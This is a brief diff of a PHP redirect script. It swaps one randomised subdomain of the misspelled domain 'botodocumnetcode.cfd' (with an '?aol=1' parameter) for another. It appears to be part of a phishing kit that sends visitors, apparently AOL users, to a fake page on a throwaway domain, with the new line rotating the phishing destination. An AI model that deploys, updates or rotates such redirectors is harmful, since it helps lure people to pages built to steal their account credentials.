@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://view-rdjef8eze.botodocumnetcode.cfd/?aol=1/");
+header("Location: https://view-yt45gp9ol.botodocumnetcode.cfd/?aol=1/");
 exit();
 ?>
